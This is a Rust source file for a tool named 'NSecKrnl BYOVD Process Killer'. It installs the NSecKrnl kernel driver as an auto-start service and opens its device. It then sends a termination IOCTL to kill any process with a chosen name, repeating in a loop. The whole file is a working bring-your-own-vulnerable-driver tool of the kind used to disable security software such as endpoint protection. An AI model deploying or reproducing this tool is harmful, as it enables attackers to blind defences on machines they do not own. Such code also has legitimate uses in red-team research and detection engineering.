#![allow(non_snake_case)]

use clap::{App, Arg};
use std::ffi::{CStr, OsStr};
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;

use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::shared::winerror::NO_ERROR;
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::processenv::GetCurrentDirectoryW;
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next,
    PROCESSENTRY32, TH32CS_SNAPPROCESS
};
use winapi::um::winnt::{
    HANDLE, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER
};
use winapi::um::winsvc::{
    CloseServiceHandle, ControlService, CreateServiceW, DeleteService,
    OpenSCManagerW, OpenServiceW, SC_HANDLE, SC_MANAGER_CREATE_SERVICE,
    SERVICE_ALL_ACCESS, SERVICE_CONTROL_STOP, SERVICE_STATUS, SERVICE_STOPPED,
    StartServiceW,
};

// ============================================================================
// Constants - NSecKrnl Driver Configuration
// ============================================================================

const DRIVER_NAME: &str = "NSecKrnl";
const DRIVER_FILE: &str = "\\NSecKrnl.sys";
const DEVICE_PATH: &str = "\\\\.\\NSecKrnl";
const IOCTL_TERMINATE_PROCESS: DWORD = 0x2248E0;

// ============================================================================
// Error Types
// ============================================================================

type Result<T> = std::result::Result<T, Box<dyn std::error::Error>>;

// ============================================================================
// RAII Handle Wrappers
// ============================================================================

struct ServiceHandle(SC_HANDLE);

impl ServiceHandle {
    fn new(handle: SC_HANDLE) -> Result<Self> {
        if handle.is_null() {
            Err("Invalid service handle".into())
        } else {
            Ok(Self(handle))
        }
    }
    
    fn as_raw(&self) -> SC_HANDLE {
        self.0
    }
}

impl Drop for ServiceHandle {
    fn drop(&mut self) {
        unsafe { CloseServiceHandle(self.0); }
    }
}

struct FileHandle(HANDLE);

impl FileHandle {
    fn new(handle: HANDLE) -> Result<Self> {
        if handle == INVALID_HANDLE_VALUE {
            Err("Invalid file handle".into())
        } else {
            Ok(Self(handle))
        }
    }
    
    fn as_raw(&self) -> HANDLE {
        self.0
    }
}

impl Drop for FileHandle {
    fn drop(&mut self) {
        unsafe { CloseHandle(self.0); }
    }
}

// ============================================================================
// Driver Manager
// ============================================================================

struct DriverManager {
    _sc_manager: ServiceHandle,
    service: ServiceHandle,
}

impl DriverManager {
    fn new() -> Result<Self> {
        println!("[*] Opening Service Control Manager");
        let sc_manager = ServiceHandle::new(unsafe {
            OpenSCManagerW(null_mut(), null_mut(), SC_MANAGER_CREATE_SERVICE)
        })?;

        let service = match ServiceHandle::new(unsafe {
            OpenServiceW(sc_manager.as_raw(), to_wstring(DRIVER_NAME).as_ptr(), SERVICE_ALL_ACCESS)
        }) {
            Ok(service) => {
                println!("[!] Service '{}' already exists", DRIVER_NAME);
                service
            }
            Err(_) => {
                println!("[*] Creating service '{}'", DRIVER_NAME);
                Self::create_service(&sc_manager)?
            }
        };

        Ok(Self {
            _sc_manager: sc_manager,
            service,
        })
    }

    fn create_service(sc_manager: &ServiceHandle) -> Result<ServiceHandle> {
        let current_dir = get_current_directory()?;
        let driver_path = format!("{}{}", current_dir, DRIVER_FILE);
        
        println!("[*] Driver path: {}", driver_path);
        
        ServiceHandle::new(unsafe {
            CreateServiceW(
                sc_manager.as_raw(),
                to_wstring(DRIVER_NAME).as_ptr(),
                to_wstring(DRIVER_NAME).as_ptr(),
                SERVICE_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                to_wstring(&driver_path).as_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                null_mut(),
                null_mut(),
            )
        })
    }

    fn start(&self) -> Result<()> {
        println!("[*] Starting driver service");
        
        let result = unsafe {
            StartServiceW(self.service.as_raw(), 0, null_mut())
        };
        
        if result == 0 {
            let error = std::io::Error::last_os_error();
            // ERROR_SERVICE_ALREADY_RUNNING = 1056
            if error.raw_os_error() == Some(1056) {
                println!("[!] Driver already running");
                return Ok(());
            }
            return Err(format!("Failed to start service: {}", error).into());
        }
        
        println!("[+] Driver started successfully");
        Ok(())
    }

    fn stop(&self) -> Result<()> {
        println!("[*] Stopping driver service");
        
        let mut status = SERVICE_STATUS {
            dwServiceType: 0,
            dwCurrentState: SERVICE_STOPPED,
            dwControlsAccepted: 0,
            dwWin32ExitCode: NO_ERROR,
            dwServiceSpecificExitCode: 0,
            dwCheckPoint: 0,
            dwWaitHint: 0,
        };

        unsafe {
            ControlService(self.service.as_raw(), SERVICE_CONTROL_STOP, &mut status);
            
            if DeleteService(self.service.as_raw()) != 0 {
                println!("[+] Service marked for deletion");
            } else {
                println!("[!] Failed to delete service (may require reboot)");
            }
        }
        
        Ok(())
    }
}

// ============================================================================
// Process Terminator
// ============================================================================

struct ProcessTerminator {
    driver_handle: FileHandle,
}

impl ProcessTerminator {
    fn new() -> Result<Self> {
        println!("[*] Opening driver device: {}", DEVICE_PATH);
        
        let driver_handle = FileHandle::new(unsafe {
            CreateFileW(
                to_wstring(DEVICE_PATH).as_ptr(),
                SERVICE_ALL_ACCESS,
                0,
                null_mut(),
                OPEN_EXISTING,
                0,
                null_mut(),
            )
        })?;
        
        println!("[+] Driver device opened successfully");
        
        Ok(Self { driver_handle })
    }

    fn terminate_process(&self, pid: DWORD) {
        let pid_qword: u64 = pid as u64;
        let mut bytes_returned: DWORD = 0;

        // Driver always returns error even on success - ignore return value
        unsafe {
            DeviceIoControl(
                self.driver_handle.as_raw(),
                IOCTL_TERMINATE_PROCESS,
                &pid_qword as *const _ as LPVOID,
                mem::size_of::<u64>() as DWORD,
                null_mut(),
                0,
                &mut bytes_returned,
                null_mut(),
            );
        }
    }
}

// ============================================================================
// Process Enumeration
// ============================================================================

fn find_process_by_name(process_name: &str) -> Result<Option<DWORD>> {
    let snapshot = FileHandle::new(unsafe {
        CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    })?;

    let mut entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(snapshot.as_raw(), &mut entry) } == 0 {
        return Err("Failed to enumerate processes".into());
    }

    let target_name = process_name.to_lowercase();

    loop {
        let current_name = unsafe {
            CStr::from_ptr(entry.szExeFile.as_ptr())
        }
        .to_string_lossy()
        .to_lowercase();

        if current_name == target_name {
            return Ok(Some(entry.th32ProcessID));
        }

        if unsafe { Process32Next(snapshot.as_raw(), &mut entry) } == 0 {
            break;
        }
    }

    Ok(None)
}

// ============================================================================
// Utility Functions
// ============================================================================

fn to_wstring(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(Some(0))
        .collect()
}

fn get_current_directory() -> Result<String> {
    let mut buffer = vec![0u16; 260];
    let length = unsafe {
        GetCurrentDirectoryW(buffer.len() as u32, buffer.as_mut_ptr())
    };
    
    if length == 0 {
        return Err("Failed to get current directory".into());
    }
    
    buffer.truncate(length as usize);
    Ok(String::from_utf16_lossy(&buffer))
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {

    let matches = App::new("NSecKrnl BYOVD Process Killer")
        .version("1.0")
        .author("BlackSnufkin")
        .about("Kills a process by name using NSecKrnl driver")
        .arg(Arg::new("process_name").short("n").long("name").takes_value(true))
        .get_matches();


    let process_name = matches.value_of("process_name").unwrap();

    // Initialize driver
    let driver_manager = DriverManager::new()?;
    driver_manager.start()?;

    // Open driver device
    let terminator = ProcessTerminator::new()?;

    // Setup Ctrl+C handler
    let running = Arc::new(AtomicBool::new(true));
    let running_clone = running.clone();
    
    ctrlc::set_handler(move || {
        println!("\n[!] Received shutdown signal");
        running_clone.store(false, Ordering::SeqCst);
    })?;

    println!("[*] Monitoring for process: {} (Press Ctrl+C to stop)\n", process_name);

    // Monitoring loop
    while running.load(Ordering::SeqCst) {
        if let Some(pid) = find_process_by_name(process_name)? {
            // Send termination IOCTL (driver always returns error but may succeed)
            let _ = terminator.terminate_process(pid);
            
            // Wait a moment and verify if process actually terminated
            thread::sleep(Duration::from_millis(100));
            
            if find_process_by_name(process_name)?.is_none() {
                println!("[+] Process {} terminated successfully", pid);
            } else {
                println!("[!] Process {} still running (may be protected)", pid);
            }
        }
        
        thread::sleep(Duration::from_millis(700));
    }

    // Cleanup
    println!("\n[*] Cleaning up...");
    driver_manager.stop()?;
    println!("[+] Shutdown complete");

    Ok(())
}